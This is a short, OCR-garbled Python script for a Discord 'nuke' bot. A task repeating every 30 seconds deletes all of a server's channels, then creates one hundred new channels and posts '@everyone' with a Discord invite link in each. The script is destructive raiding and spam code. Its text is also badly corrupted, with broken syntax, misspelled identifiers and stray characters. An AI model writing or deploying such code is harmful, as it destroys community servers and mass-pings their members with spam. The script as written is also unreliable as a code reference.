Import discord
from discord.ext import commands, tasks import asyncio
Tron keep alive
laport
keep alive
keep alive()
intents = discord. Intents.default()
intents.messages a True
intents-guilds = True
intents.message_content = True
bot = commands.Bot (command_prefix=',', intents=intents)
my_secret = os. environ[ 'TOKEN' ]
@tasks.Loop(seconds=30)
async def nuke_channels(guild):
try:
* Increase the time interval between loops
for channel in guild.channels:
await channel.delete()
await asyncio.sleep(0.6) # Adding a small delay between channel deletions
for 1 in range(1, 101):
channel_nane = f*Channel-(1)"
new_channel = await guild.create_text_channel (channel name)
await new_channel. send("@everyone https://discord.gg/petguhadap*)
await asyncio.sleep(0.6) # Adding a delay between channel creations
except
discord. Forbidden:
print ("Missing permissions to perform channel operations.")
except Exception as e:
print(t"An error occurred: {e)")
